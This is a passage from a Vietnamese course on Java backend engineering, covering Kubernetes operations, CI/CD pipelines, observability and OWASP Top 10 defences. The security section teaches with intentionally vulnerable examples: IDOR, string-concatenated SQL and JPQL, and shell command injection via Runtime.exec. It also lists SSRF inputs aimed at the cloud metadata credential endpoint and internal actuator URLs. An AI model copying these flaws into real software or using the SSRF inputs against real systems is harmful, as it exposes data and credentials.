Lưu ý với JVM: CPU spike lúc khởi động (JIT) làm HPA tưởng tải cao → scale thêm → thêm pod khởi động → vòng lặp. Dùng stabilization window, và cân nhắc metric phản ánh tải thật (req/s, độ dài hàng đợi Kafka — qua Prometheus Adapter hoặc **KEDA**). Memory không phải metric scale tốt cho JVM (heap không co lại nhanh sau GC).

### 7.6 Rolling update và tương thích ngược
Trong lúc rolling update, **phiên bản cũ và mới chạy song song**. Mọi thay đổi phải tương thích hai chiều:
- DB schema: **expand → migrate → contract**. Ví dụ đổi tên cột: (1) thêm cột mới, code ghi cả hai, (2) backfill, (3) code chỉ đọc cột mới, (4) xóa cột cũ ở release sau. Flyway migration chạy trước khi pod mới nhận traffic (init container hoặc Job), không phá vỡ code cũ.
- API/event: thêm field được; xóa/đổi tên field cần versioning.
- Rollback: `kubectl rollout undo deployment/order-service` — chỉ an toàn khi migration DB tương thích ngược.

### 7.7 Lệnh debug hằng ngày

```bash
kubectl get pods -l app=order-service -o wide
kubectl describe pod <pod>                 # Events: FailedScheduling, probe failed, OOMKilled, ImagePullBackOff
kubectl logs <pod> -c app --previous       # log của container ĐÃ CHẾT (CrashLoopBackOff)
kubectl logs -l app=order-service --since=10m -f --max-log-requests=10
kubectl get events --sort-by=.lastTimestamp
kubectl top pod -l app=order-service       # cần metrics-server
kubectl exec -it <pod> -- sh               # không dùng được với distroless
kubectl debug -it <pod> --image=eclipse-temurin:21-jdk --target=app -- bash   # ephemeral container, chung PID namespace -> chạy jcmd/jstack
kubectl port-forward svc/order-service 8080:80
kubectl rollout status deployment/order-service
kubectl rollout history deployment/order-service
kubectl rollout undo deployment/order-service --to-revision=4
```

> ⚠️ **Lỗi thường gặp:** `CrashLoopBackOff` do thiếu config/secret (xem `--previous`); `ImagePullBackOff` do sai tag/thiếu `imagePullSecrets`; probe trỏ vào cổng chính bị auth chặn (401 → probe fail); `latest` tag + `imagePullPolicy: IfNotPresent` → node chạy image cũ; không có PDB → node drain giết cùng lúc mọi replica.

### 🛠 Bài tập phần 7

**Bài 7.1 — Deploy lên cluster local (Cơ bản)**
- Đề bài: Dùng kind/minikube/k3d, deploy app (image từ phần 5) với Deployment, Service, ConfigMap, Secret, Ingress. Cấu hình probes Actuator như 7.2.
- Tiêu chí: `kubectl get pods` 3/3 Ready; gọi được qua Ingress; đổi giá trị ConfigMap và giải thích vì sao pod không tự nhận (cần restart hoặc dùng Spring Cloud Kubernetes reload / mount file).

**Bài 7.2 — Zero-downtime rolling update (Trung bình)**
- Đề bài: Chạy k6 liên tục 50 req/s trong khi `kubectl set image` sang version mới. Lần 1: không có preStop, `terminationGracePeriodSeconds: 5`, `server.shutdown=immediate`. Lần 2: cấu hình như 7.2/7.4.
- Tiêu chí: lần 1 có lỗi (502/connection reset), lần 2 lỗi = 0; giải thích trình tự shutdown bằng sơ đồ thời gian.

**Bài 7.3 — Liveness sai và hiệu ứng dây chuyền (Nâng cao)**
- Đề bài: Thêm DB vào liveness group, scale 5 replica, dừng PostgreSQL 60 giây. Quan sát restart count, thời gian phục hồi. Sau đó sửa (liveness chỉ trạng thái nội bộ, circuit breaker cho DB), lặp lại thí nghiệm. Thêm HPA dựa trên CPU và quan sát hành vi khi khởi động hàng loạt.
- Tiêu chí: báo cáo so sánh (restart count, thời gian lỗi kéo dài sau khi DB phục hồi); đề xuất cấu hình probes chuẩn cho team.

<details>
<summary>Gợi ý lời giải</summary>

- 7.1: ConfigMap qua env chỉ đọc lúc khởi động → `kubectl rollout restart deployment/...`. Mẹo: thêm annotation checksum của ConfigMap vào pod template (Helm `sha256sum`) để thay đổi config tự kích hoạt rollout.
- 7.2: lỗi lần 1 đến từ khoảng hở giữa SIGTERM và việc gỡ endpoint, cộng với request đang xử lý bị cắt.
- 7.3: `management.endpoint.health.group.liveness.include=livenessState,db` là cấu hình "sai" để tái hiện. Sau sửa: pod chuyển unready (nếu readiness có db) hoặc vẫn ready nhưng trả 503 nhanh nhờ circuit breaker; không restart.

</details>

---

<a id="p8"></a>
## 8. Thiết kế pipeline CI/CD

### 8.1 Nguyên tắc
- **Continuous Integration:** mọi thay đổi được tích hợp vào trunk thường xuyên và được kiểm chứng tự động. **Continuous Delivery:** mọi commit trên trunk *có thể* release bất cứ lúc nào (deploy prod cần một nút bấm). **Continuous Deployment:** tự động deploy prod.
- **Build once, deploy many:** artifact (image digest) được build **một lần**, sau đó **chính artifact đó** được promote qua dev → staging → prod; khác biệt môi trường nằm ở **cấu hình**, không ở build.
- **Fail fast:** bước rẻ và hay fail chạy trước (compile, unit test, lint); bước đắt chạy sau, song song khi được.
- **Pipeline as code**, review như code; runner/agent tạm thời, không trạng thái.
- **Đo bằng DORA metrics:** deployment frequency, lead time for changes, change failure rate, time to restore service.

### 8.2 Các stage

```
 PR / push
   │
   ├─ 1. Build & unit test        (mvn -B verify -DskipITs; Spotless/Checkstyle; < 5 phút)
   ├─ 2. Static analysis & SAST    (SpotBugs+FindSecBugs, Sonar quality gate, CodeQL/Semgrep)
   ├─ 3. Integration test          (Testcontainers; Failsafe)
   ├─ 4. SCA dependency scan       (OWASP Dependency-Check / Snyk / Dependabot alerts; fail CVSS >= 7)
   ├─ 5. Package image             (Dockerfile/Jib), SBOM (CycloneDX/Syft), image scan (Trivy)
   ├─ 6. Sign & push               (cosign, push vào registry với tag = git SHA)
   │        ── chỉ trên main ──
   ├─ 7. Deploy staging            (Helm/Kustomize/GitOps), DB migration
   ├─ 8. Smoke / contract / E2E    (vài kịch bản sống còn, can-i-deploy)
   ├─ 9. Deploy prod               (approval thủ công nếu cần; canary hoặc blue-green)
   └─ 10. Post-deploy verification (theo dõi error rate/latency so với baseline; auto rollback)
```

**Chiến lược release:**
- **Rolling update:** mặc định K8s; rẻ; cũ/mới chạy song song.
- **Blue-green:** 2 môi trường đầy đủ, chuyển traffic một lần; rollback tức thì; tốn gấp đôi tài nguyên; DB vẫn là điểm dùng chung.
- **Canary:** đưa 1% → 10% → 50% → 100% traffic sang bản mới, tự động so sánh metric (Argo Rollouts, Flagger); phát hiện lỗi với ảnh hưởng nhỏ.
- **Feature flag:** tách *deploy* khỏi *release* — code lên prod nhưng tắt; bật dần theo nhóm người dùng.
- **GitOps (Argo CD, Flux):** trạng thái mong muốn của cluster nằm trong một repo Git; pipeline CI chỉ cập nhật tag image trong repo đó; controller trong cluster tự đồng bộ → audit trail, rollback = `git revert`, cluster không cần mở quyền cho CI.

### 8.3 Ví dụ GitHub Actions

```yaml
# .github/workflows/ci.yml
name: ci
on:
  pull_request:
  push:
    branches: [main]

permissions:
  contents: read            # tối thiểu; job nào cần thêm thì tự khai báo

concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: true  # PR push mới hủy build cũ

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4          # production: ghim theo commit SHA đầy đủ
      - uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: '21'
          cache: maven
      - name: Build, unit test, static analysis
        run: ./mvnw -B -ntp verify -DskipITs
      - name: Integration tests (Testcontainers dùng Docker có sẵn trên runner)
        run: ./mvnw -B -ntp failsafe:integration-test failsafe:verify
      - name: Dependency scan
        run: ./mvnw -B -ntp org.owasp:dependency-check-maven:check -DfailBuildOnCVSS=7 -DnvdApiKey=${{ secrets.NVD_API_KEY }}
      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: reports
          path: |
            **/target/surefire-reports
            **/target/failsafe-reports
            **/target/site/jacoco
            target/dependency-check-report.html

  image:
    needs: build
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write
      id-token: write                       # OIDC: keyless signing / đăng nhập cloud không cần secret dài hạn
    outputs:
      digest: ${{ steps.push.outputs.digest }}
    steps:
      - uses: actions/checkout@v4
      - uses: docker/setup-buildx-action@v3
      - uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}
      - id: push
        uses: docker/build-push-action@v6
        with:
          push: true
          tags: ghcr.io/${{ github.repository }}:${{ github.sha }}
          cache-from: type=gha
          cache-to: type=gha,mode=max
          provenance: true
          sbom: true
      - name: Scan image
        uses: aquasecurity/trivy-action@0.28.0
        with:
          image-ref: ghcr.io/${{ github.repository }}@${{ steps.push.outputs.digest }}
          severity: HIGH,CRITICAL
          exit-code: '1'
          ignore-unfixed: true

  deploy-staging:
    needs: image
    runs-on: ubuntu-latest
    environment: staging                    # environment protection rules, secrets riêng
    steps:
      - uses: actions/checkout@v4
      - name: Update GitOps repo with new digest
        run: |
          echo "Cập nhật image digest ${{ needs.image.outputs.digest }} vào repo cấu hình (Kustomize/Helm values) và mở PR/commit"
```

**GitLab CI** tương đương (rút gọn):
```yaml
stages: [build, test, package, deploy]
variables:
  MAVEN_OPTS: "-Dmaven.repo.local=$CI_PROJECT_DIR/.m2/repository"
cache:
  key: { files: [pom.xml] }
  paths: [.m2/repository]
build:
  stage: build
  image: eclipse-temurin:21-jdk
  script: ./mvnw -B verify -DskipITs
  artifacts: { reports: { junit: target/surefire-reports/TEST-*.xml } }
integration:
  stage: test
  image: eclipse-temurin:21-jdk
  services: [docker:dind]                 # Testcontainers cần Docker
  variables: { DOCKER_HOST: "tcp://docker:2375", DOCKER_TLS_CERTDIR: "" }
  script: ./mvnw -B verify
deploy_prod:
  stage: deploy
  rules: [{ if: '$CI_COMMIT_BRANCH == "main"', when: manual }]
  environment: production
  script: helm upgrade --install order ./chart --set image.tag=$CI_COMMIT_SHA --atomic --timeout 5m
```

**Jenkins (Declarative Pipeline)**:
```groovy
pipeline {
  agent { kubernetes { yamlFile 'ci/pod.yaml' } }   // agent tạm thời trên K8s
  options { timeout(time: 30, unit: 'MINUTES'); disableConcurrentBuilds() }
  stages {
    stage('Build')   { steps { sh './mvnw -B verify -DskipITs' } }
    stage('IT')      { steps { sh './mvnw -B failsafe:integration-test failsafe:verify' } }
    stage('Image')   { when { branch 'main' } steps { sh './mvnw -B compile jib:build -Dimage=registry/acme/order:${GIT_COMMIT}' } }
    stage('Deploy prod') {
      when { branch 'main' }
      steps { input message: 'Deploy to prod?'; sh 'helm upgrade --install order ./chart --set image.tag=${GIT_COMMIT} --atomic' }
    }
  }
  post { always { junit '**/target/*-reports/TEST-*.xml' } }
}
```

> 💡 **Góc nhìn Senior — an ninh của chính pipeline:** CI có quyền deploy prod và đọc secret → là mục tiêu tấn công giá trị (vụ Codecov 2021, các vụ GitHub Action bị chiếm quyền như `tj-actions/changed-files` 2025). Biện pháp: `permissions` tối thiểu; **ghim action theo commit SHA**; không chạy workflow có secret cho PR từ fork (`pull_request_target` rất nguy hiểm nếu checkout code của PR); dùng **OIDC** thay secret dài hạn để đăng nhập cloud; tách quyền deploy prod vào environment có approval; ký artifact và kiểm tra chữ ký khi deploy (admission policy).

> ⚠️ **Lỗi thường gặp:** build lại image riêng cho từng môi trường; pipeline 45 phút nên dev bỏ qua; test flaky được "retry cho xanh"; deploy prod bằng lệnh tay từ laptop; Helm `upgrade` không `--atomic` → release dở dang; không có bước kiểm tra sau deploy.

### 🛠 Bài tập phần 8

**Bài 8.1 — Pipeline CI cơ bản (Cơ bản)**
- Đề bài: Viết workflow GitHub Actions cho project Module 15: build + unit test + integration test (Testcontainers) + upload báo cáo; cache Maven.
- Tiêu chí: PR hiển thị kết quả test; build thứ hai nhanh hơn nhờ cache; `permissions: contents: read`.

**Bài 8.2 — Image, scan, SBOM (Trung bình)**
- Đề bài: Thêm job build image (Jib hoặc Dockerfile), sinh SBOM CycloneDX (`cyclonedx-maven-plugin` hoặc Syft), quét bằng Trivy, push lên GHCR với tag = SHA. Fail pipeline khi có CVE CRITICAL có bản vá.
- Tiêu chí: cố ý dùng base image cũ để thấy pipeline đỏ; SBOM được lưu làm artifact.

**Bài 8.3 — GitOps + canary (Nâng cao)**
- Đề bài: Cài Argo CD (và tùy chọn Argo Rollouts) vào kind. Repo cấu hình riêng chứa Kustomize overlay `staging`/`prod`. CI chỉ cập nhật digest trong overlay staging; promote prod bằng PR. Với Argo Rollouts: canary 20% → 50% → 100% với `AnalysisTemplate` truy vấn Prometheus error rate.
- Tiêu chí: rollback bằng `git revert`; một bản lỗi cố ý (trả 500 với 30% request) bị tự động abort ở bước canary.

<details>
<summary>Gợi ý lời giải</summary>

- 8.1: `actions/setup-java` với `cache: maven`; Testcontainers chạy được trên `ubuntu-latest` vì có Docker.
- 8.2: `mvn org.cyclonedx:cyclonedx-maven-plugin:makeAggregateBom` → `target/bom.json`; Trivy có thể quét SBOM: `trivy sbom target/bom.json`.
- 8.3: AnalysisTemplate truy vấn dạng `sum(rate(http_server_requests_seconds_count{status=~"5..",app="order"}[2m])) / sum(rate(http_server_requests_seconds_count{app="order"}[2m]))` với `successCondition: result[0] < 0.01`.

</details>

---

<a id="p9"></a>
## 9. Observability trong thực tế

### 9.1 Ba trụ cột và câu hỏi chúng trả lời
- **Metrics:** "Có vấn đề không, ở mức tổng thể?" — số liệu tổng hợp theo thời gian, rẻ để lưu, dùng cho dashboard và alert.
- **Logs:** "Chuyện gì đã xảy ra với *request/sự kiện này*?" — chi tiết, đắt khi khối lượng lớn.
- **Traces:** "Request này đi qua đâu, chậm ở đâu?" — đường đi xuyên service.

Observability tốt = **liên kết** được ba thứ: từ alert (metric) → exemplar/trace chậm → log của đúng request đó qua `traceId`.

### 9.2 Structured logging và MDC
Log dạng text tự do khó truy vấn. Log có cấu trúc (JSON) cho phép lọc theo field trong Loki/Elasticsearch/Cloud Logging.

```yaml
# Spring Boot 3.4+: structured logging dựng sẵn (ecs | logstash | gelf)
logging:
  structured:
    format:
      console: ecs
  level:
    root: INFO
    com.acme: INFO
```

```java
@Slf4j
@RestController
class CheckoutController {
    @PostMapping("/api/carts/{cartId}/checkout")
    ResponseEntity<OrderDto> checkout(@PathVariable String cartId, @AuthenticationPrincipal Jwt jwt) {
        try (var ignored = MDC.putCloseable("cartId", cartId);
             var ignored2 = MDC.putCloseable("userId", jwt.getSubject())) {
            log.info("checkout started");                       // MDC tự đi kèm dưới dạng field JSON
            OrderDto order = service.checkout(cartId);
            log.atInfo().addKeyValue("orderId", order.id())     // SLF4J 2 fluent API: key-value có cấu trúc
                        .addKeyValue("total", order.total())
                        .log("checkout completed");
            return ResponseEntity.status(201).body(order);
        }
    }
}
```
- **MDC** (Mapped Diagnostic Context) là `ThreadLocal` → **không tự đi theo** khi chuyển thread (`@Async`, `CompletableFuture`, executor, Reactor). Giải pháp: `TaskDecorator` sao chép MDC, hoặc thư viện **Micrometer Context Propagation** (Spring Boot 3 dùng cho tracing; Reactor: `Hooks.enableAutomaticContextPropagation()`).
- Với Micrometer Tracing, `traceId`/`spanId` được tự đưa vào MDC → mọi log có traceId.
- Một **filter** đặt `requestId` vào MDC và `MDC.clear()` trong `finally` — thread pool tái sử dụng thread, quên clear là log của request này mang id của request trước.

**Quy tắc log:** log sự kiện có ý nghĩa nghiệp vụ và lỗi có ngữ cảnh; `ERROR` = cần người can thiệp; không log trong vòng lặp nóng; **không log secret, token, password, số thẻ, PII** (masking); log exception kèm stack trace một lần ở nơi xử lý, không "log và ném lại" ở mọi tầng; log injection: không ghi nguyên input người dùng chứa `\r\n` vào log text (JSON encoder tự escape).

### 9.3 Metrics với Micrometer

```java
@Service
class PaymentService {
    private final Counter failures;
    private final Timer gatewayTimer;
    private final AtomicInteger inFlight;

    PaymentService(MeterRegistry registry) {
        this.failures = Counter.builder("payment.failures")
            .description("Số lần thanh toán thất bại")
            .tag("gateway", "vnpay")                       // tag có cardinality THẤP
            .register(registry);
        this.gatewayTimer = Timer.builder("payment.gateway.latency")
            .publishPercentileHistogram()                  // histogram -> tính percentile ở Prometheus, gộp được giữa các pod
            .serviceLevelObjectives(Duration.ofMillis(200), Duration.ofMillis(500))
            .register(registry);
        this.inFlight = registry.gauge("payment.inflight", new AtomicInteger());
    }

    PaymentResult pay(PaymentRequest req) {
        inFlight.incrementAndGet();
        try {
            return gatewayTimer.record(() -> gateway.charge(req));
        } catch (GatewayException e) {
            failures.increment();
            throw e;
        } finally {
            inFlight.decrementAndGet();
        }
    }
}
```
- Loại meter: `Counter` (chỉ tăng), `Gauge` (giá trị tức thời), `Timer` (số lần + tổng thời gian + phân phối), `DistributionSummary` (phân phối của giá trị không phải thời gian, vd kích thước payload), `LongTaskTimer` (tác vụ dài đang chạy).
- Spring Boot tự cung cấp: `http.server.requests`, `jvm.memory.used`, `jvm.gc.pause`, `jvm.threads.*`, `hikaricp.connections.*`, `tomcat.*`, `kafka.consumer.*`, `cache.*`… Xuất cho Prometheus qua `micrometer-registry-prometheus` tại `/actuator/prometheus`.
- **Percentile phía client** (`publishPercentiles(0.99)`) **không gộp được** giữa các instance (không thể lấy trung bình p99). Dùng **histogram** + `histogram_quantile()` trong PromQL.
- `@Timed`/`@Observed` (Micrometer Observation API) — một Observation sinh cả metric và span.

> ⚠️ **Cardinality explosion:** tag với giá trị không giới hạn (`userId`, `orderId`, URL đầy đủ có id `/orders/123`) → mỗi giá trị là một time series → Prometheus hết RAM. Spring dùng **URI template** (`/orders/{id}`) cho tag `uri` — nhưng nếu request 404 không khớp route, hoặc bạn tự tạo tag từ path thô, sẽ nổ.

### 9.4 RED, USE, Four Golden Signals
- **RED** (Tom Wilkie) cho **service/request-driven**: **R**ate (req/s), **E**rrors (tỷ lệ lỗi), **D**uration (phân phối latency). Mỗi service, mỗi endpoint quan trọng, mỗi dependency gọi ra ngoài.
- **USE** (Brendan Gregg) cho **tài nguyên**: **U**tilization, **S**aturation (hàng đợi, chờ), **E**rrors. Áp dụng cho CPU, memory, disk, network — và cả tài nguyên ứng dụng: thread pool (active/max, queue size), connection pool (active, pending), Kafka consumer lag.
- **Four Golden Signals** (Google SRE): latency, traffic, errors, saturation.

PromQL mẫu (RED cho một service):
```promql
# Rate
sum(rate(http_server_requests_seconds_count{application="order-service"}[5m]))
# Error ratio
sum(rate(http_server_requests_seconds_count{application="order-service",status=~"5.."}[5m]))
  / sum(rate(http_server_requests_seconds_count{application="order-service"}[5m]))
# p99 latency theo endpoint
histogram_quantile(0.99, sum by (le, uri) (rate(http_server_requests_seconds_bucket{application="order-service"}[5m])))
# Saturation: connection pool
max(hikaricp_connections_pending{application="order-service"})
```

### 9.5 Distributed tracing với OpenTelemetry
- **Trace** = cây các **span**; span có tên, thời gian bắt đầu/kết thúc, attributes, status, parent. **Context propagation** qua header W3C `traceparent: 00-<trace-id>-<span-id>-<flags>` (HTTP) hoặc header của message Kafka.
- **OpenTelemetry (OTel)** = chuẩn mở gồm API, SDK, giao thức OTLP, **Collector** (nhận, xử lý, sampling, export sang Jaeger/Tempo/Zipkin/vendor).
- Hai cách tích hợp với Java/Spring:
  1. **OTel Java agent** (auto-instrumentation, không đổi code):
     ```bash
     java -javaagent:/otel/opentelemetry-javaagent.jar \
          -Dotel.service.name=order-service \
          -Dotel.exporter.otlp.endpoint=http://otel-collector:4317 \
          -Dotel.traces.sampler=parentbased_traceidratio -Dotel.traces.sampler.arg=0.1 \
          -jar app.jar
     ```
     Agent instrument sẵn Spring MVC, JDBC, Kafka, HTTP client, Redis…
  2. **Micrometer Tracing** (Spring Boot 3) với bridge `micrometer-tracing-bridge-otel` + exporter `opentelemetry-exporter-otlp`; cấu hình `management.tracing.sampling.probability=0.1`, `management.otlp.tracing.endpoint=...`. Dùng Observation API; tự instrument `RestClient`/`WebClient` **khi tạo từ builder do Spring cung cấp**.
- **Sampling:** head-based (quyết định ở đầu trace, rẻ, nhưng có thể bỏ sót trace lỗi) vs tail-based (Collector giữ trace hoàn chỉnh rồi quyết định — giữ mọi trace lỗi/chậm, tốn tài nguyên Collector).
- Span thủ công cho đoạn logic quan trọng: `Observation.createNotStarted("pricing.calculate", registry).observe(() -> ...)` hoặc OTel `tracer.spanBuilder(...)`.

> 💡 **Góc nhìn Senior:** Tracing chỉ có giá trị khi **mọi hop** propagate context. Điểm gãy thường gặp: HTTP client tự `new` (không qua builder Spring), thread pool tự tạo, message Kafka gửi bằng code tự viết không thêm header, gateway/proxy bỏ header. Kiểm tra bằng một trace thật xuyên qua toàn bộ luồng trước khi tuyên bố "đã có tracing".

### 9.6 SLI, SLO, error budget và alerting
- **SLI** (indicator): đại lượng đo được về trải nghiệm người dùng, thường là tỷ lệ: `request thành công & nhanh hơn 300ms / tổng request`.
- **SLO** (objective): mục tiêu cho SLI trong một cửa sổ: "99.9% request checkout thành công trong 300ms, tính theo 30 ngày cuốn chiếu".
- **SLA** (agreement): cam kết hợp đồng với khách hàng, có phạt; luôn **lỏng hơn** SLO nội bộ.
- **Error budget** = 1 − SLO. 99.9% trong 30 ngày → 0.1% × 43.200 phút = **43,2 phút** "được phép hỏng". Còn budget → được deploy nhanh, thử nghiệm; hết budget → ưu tiên độ tin cậy (đóng băng tính năng, sửa nợ kỹ thuật). Biến tranh luận "dev muốn nhanh vs ops muốn ổn định" thành con số chung.

| SLO | Downtime cho phép / 30 ngày |
|---|---|
| 99% | 7,2 giờ |
| 99.9% | 43,2 phút |
| 99.95% | 21,6 phút |
| 99.99% | 4,32 phút |

**Alerting:**
- Alert theo **triệu chứng ảnh hưởng người dùng** (SLO bị đe dọa), không theo nguyên nhân (CPU 80% không phải sự cố nếu người dùng vẫn ổn). Nguyên nhân để trên dashboard dùng khi chẩn đoán.
- Mỗi alert gây **page** phải **actionable**, khẩn cấp, có **runbook**. Alert không ai xử lý → xóa hoặc hạ thành ticket. Alert fatigue là nguyên nhân bỏ lỡ sự cố thật.
- **Burn rate alert** (SRE Workbook): burn rate = tốc độ tiêu budget so với mức "vừa đủ hết đúng cuối cửa sổ". Burn rate 14,4 trong 1 giờ tiêu 2% budget 30 ngày → page. Dùng **multi-window** (vd 1h **và** 5m cùng vượt ngưỡng) để vừa phát hiện nhanh vừa tự tắt nhanh khi hết sự cố. Ngưỡng tham khảo: 14,4× (1h/5m) → page; 6× (6h/30m) → page; 1× (3 ngày/6h) → ticket.

```yaml
# Prometheus rule (rút gọn) — SLO 99.9% => error budget 0.001
- alert: CheckoutErrorBudgetFastBurn
  expr: |
    (
      sum(rate(http_server_requests_seconds_count{uri="/api/carts/{cartId}/checkout",status=~"5.."}[1h]))
      / sum(rate(http_server_requests_seconds_count{uri="/api/carts/{cartId}/checkout"}[1h]))
    ) > (14.4 * 0.001)
    and
    (
      sum(rate(http_server_requests_seconds_count{uri="/api/carts/{cartId}/checkout",status=~"5.."}[5m]))
      / sum(rate(http_server_requests_seconds_count{uri="/api/carts/{cartId}/checkout"}[5m]))
    ) > (14.4 * 0.001)
  labels: { severity: page }
  annotations:
    summary: "Checkout đang tiêu error budget nhanh (14.4x)"
    runbook_url: "https://runbooks.acme.internal/checkout-errors"
```

> ⚠️ **Lỗi thường gặp:** đặt SLO 100% (không thể đạt, không còn budget để thay đổi); SLO đo ở server trong khi user thấy lỗi ở load balancer/CDN; dashboard 50 biểu đồ nhưng không ai biết nhìn cái nào; log mức DEBUG ở prod làm đầy đĩa và tăng chi phí; tracing 100% sampling ở hệ thống lớn.

### 🛠 Bài tập phần 9

**Bài 9.1 — Structured logging + MDC qua thread (Cơ bản)**
- Đề bài: Bật structured logging ECS, viết filter đặt `requestId` vào MDC, gọi một method `@Async`. Chứng minh log trong `@Async` mất `requestId`, sau đó sửa bằng `TaskDecorator`.
- Tiêu chí: mọi dòng log của một request (kể cả async) có cùng `requestId`; MDC được clear sau request.

**Bài 9.2 — Dashboard RED + USE (Trung bình)**
- Đề bài: Dựng Prometheus + Grafana bằng docker-compose, scrape `/actuator/prometheus`. Tạo dashboard: RED cho 3 endpoint, USE cho JVM heap, GC pause, Tomcat threads, Hikari pool. Thêm custom metric nghiệp vụ (`orders.placed` counter, `payment.gateway.latency` timer với histogram).
- Tiêu chí: chạy k6 và giải thích dashboard; cố ý thêm tag `orderId` vào counter, quan sát số series tăng (`count({__name__=~"orders_placed.*"})`), rồi sửa.

**Bài 9.3 — Tracing xuyên service + SLO alert (Nâng cao)**
- Đề bài: 2 service (`order` → HTTP → `payment`, `order` → Kafka → `inventory`) với OTel (agent hoặc Micrometer Tracing) export về Collector → Jaeger/Tempo. Định nghĩa SLO cho checkout, viết rule burn-rate multi-window, mô phỏng sự cố (payment trả 500 với 5% request) và chứng minh alert bắn.
- Tiêu chí: một trace hiển thị đủ 3 service bao gồm span Kafka producer/consumer; log của cả 3 service tìm được bằng `traceId`; tính tay thời gian để alert bắn.

<details>
<summary>Gợi ý lời giải</summary>

- 9.1:
```java
@Bean TaskDecorator mdcTaskDecorator() {
    return runnable -> {
        Map<String, String> ctx = MDC.getCopyOfContextMap();
        return () -> {
            Map<String, String> previous = MDC.getCopyOfContextMap();
            try { if (ctx != null) MDC.setContextMap(ctx); runnable.run(); }
            finally { if (previous != null) MDC.setContextMap(previous); else MDC.clear(); }
        };
    };
}
```
Gắn vào `ThreadPoolTaskExecutor.setTaskDecorator(...)` (Boot tự áp `TaskDecorator` bean cho executor auto-configured).
- 9.3: 5% lỗi = burn rate 50× với SLO 99.9% → vượt 14,4× nên cả cửa sổ 5m và 1h vượt ngưỡng sau vài phút (cửa sổ 1h cần lỗi tích lũy: 0.05 × t/60 > 0.0144 → t ≈ 17 phút nếu trước đó không lỗi). Đây là lý do có thêm alert cho ngưỡng cao hơn / cửa sổ ngắn hơn với sự cố nghiêm trọng.

</details>

---

<a id="p10"></a>
## 10. Application security: OWASP Top 10 cho Java

### 10.1 Bản đồ OWASP Top 10
Bản 2021 (được dùng rộng rãi nhất trong phỏng vấn): A01 Broken Access Control · A02 Cryptographic Failures · A03 Injection · A04 Insecure Design · A05 Security Misconfiguration · A06 Vulnerable and Outdated Components · A07 Identification and Authentication Failures · A08 Software and Data Integrity Failures · A09 Security Logging and Monitoring Failures · A10 Server-Side Request Forgery (SSRF).

> Bản cập nhật 2025 giữ Broken Access Control ở vị trí số 1 (và gộp SSRF vào đó), nâng tầm rủi ro chuỗi cung ứng phần mềm thành mục riêng (Software Supply Chain Failures), và thêm mục về xử lý sai các điều kiện ngoại lệ. Hãy đối chiếu bản chính thức tại owasp.org/Top10 khi trích dẫn. Để kiểm tra có hệ thống theo mức độ, dùng **OWASP ASVS**.

### 10.2 A01 — Broken Access Control
Lỗ hổng phổ biến nhất: **IDOR / BOLA** — user A đọc/sửa tài nguyên của user B chỉ bằng cách đổi id.

```java
// ❌ Chỉ kiểm tra "đã đăng nhập"
@GetMapping("/api/orders/{id}")
OrderDto get(@PathVariable long id) {
    return mapper.toDto(repo.findById(id).orElseThrow());
}

// ✅ Cách 1: ràng buộc quyền sở hữu ngay trong truy vấn
@GetMapping("/api/orders/{id}")
OrderDto get(@PathVariable long id, @AuthenticationPrincipal Jwt jwt) {
    return repo.findByIdAndCustomerId(id, jwt.getSubject())
               .map(mapper::toDto)
               .orElseThrow(OrderNotFoundException::new);      // trả 404, không lộ sự tồn tại
}

// ✅ Cách 2: method security với bean kiểm tra quyền
@PreAuthorize("hasRole('ADMIN') or @orderAuthz.isOwner(#id, authentication)")
public OrderDto get(long id) { ... }
```
Các dạng khác: thiếu kiểm tra quyền ở endpoint admin, sửa field không được phép qua mass assignment (bind thẳng request vào entity có field `role`), CORS `allowedOrigins("*")` với credentials, kiểm tra quyền chỉ ở frontend. Nguyên tắc: **deny by default**, kiểm tra quyền **ở server**, trên **từng đối tượng**, và có test tự động cho rule phân quyền (Module 15).

### 10.3 A03 — Injection

```java
// ❌ SQL injection
String sql = "SELECT * FROM users WHERE email = '" + email + "'";
jdbcTemplate.queryForList(sql);
// ❌ JPQL cũng bị injection nếu nối chuỗi
em.createQuery("from User u where u.email = '" + email + "'");

// ✅ Tham số hóa
jdbcTemplate.queryForList("SELECT * FROM users WHERE email = ?", email);
em.createQuery("from User u where u.email = :email", User.class).setParameter("email", email);

// ⚠️ Tên cột/ORDER BY không tham số hóa được -> allowlist
private static final Map<String, String> SORTABLE = Map.of("createdAt", "created_at", "total", "total");
String column = Optional.ofNullable(SORTABLE.get(sortParam)).orElseThrow(BadRequestException::new);
```
Các loại khác cần biết với Java:
- **OS command injection:** `Runtime.exec("convert " + filename)` → dùng `ProcessBuilder` với danh sách tham số, validate input, tốt nhất tránh gọi shell.
- **Expression language injection:** đánh giá SpEL/OGNL/EL từ input người dùng (nguồn gốc nhiều RCE trong Struts/Spring). Không bao giờ `parser.parseExpression(userInput)`; nếu buộc phải, dùng `SimpleEvaluationContext`.
- **LDAP injection, NoSQL injection, header/CRLF injection, log injection.**
- **XSS:** template engine (Thymeleaf `th:text`) escape mặc định; cẩn thận `th:utext`; với REST API, đặt `Content-Type` đúng, CSP header.

### 10.4 A10 — SSRF
Server fetch URL do người dùng cung cấp (webhook, import ảnh từ URL, PDF render) → kẻ tấn công trỏ tới tài nguyên nội bộ: `http://169.254.169.254/latest/meta-data/iam/...` (metadata cloud → lấy credential), `http://localhost:8081/actuator/env`, `http://internal-admin/`, hoặc scheme khác (`file://`, `gopher://`).

Phòng chống (nhiều lớp):
1. **Allowlist** domain/host đích nếu có thể.
2. Chỉ cho `https`; **resolve DNS rồi kiểm tra IP** không thuộc dải private/loopback/link-local (`10/8`, `172.16/12`, `192.168/16`, `127/8`, `169.254/16`, `::1`, `fc00::/7`) — và **kết nối tới đúng IP đã kiểm tra** (chống DNS rebinding).
3. Tắt follow redirect (redirect có thể dẫn vào nội bộ) hoặc kiểm tra lại mỗi bước.
4. Hạ tầng: egress NetworkPolicy/proxy ra ngoài, IMDSv2 (AWS) yêu cầu token, service riêng biệt không có quyền cho việc fetch URL.

```java
static void assertPublicHttpsUrl(URI uri) throws UnknownHostException {
    if (!"https".equalsIgnoreCase(uri.getScheme())) throw new IllegalArgumentException("only https");
